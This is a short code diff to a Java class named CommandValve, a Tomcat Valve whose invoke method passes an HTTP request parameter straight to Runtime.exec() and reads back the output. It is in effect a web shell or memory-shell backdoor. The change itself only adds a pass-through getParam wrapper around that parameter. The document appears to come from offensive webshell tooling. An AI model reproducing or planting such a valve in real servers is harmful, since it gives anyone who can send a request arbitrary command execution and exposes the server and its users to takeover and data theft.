@@ -39,9 +39,13 @@ public class CommandValve implements Valve {
     public void backgroundProcess() {
     }
 
+    public String getParam(String param) {
+        return param;
+    }
+
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
-        String cmd = request.getParameter(paramName);
+        String cmd = getParam(request.getParameter(paramName));
         if (cmd != null) {
             Process exec = Runtime.getRuntime().exec(cmd);
             InputStream inputStream = exec.getInputStream();
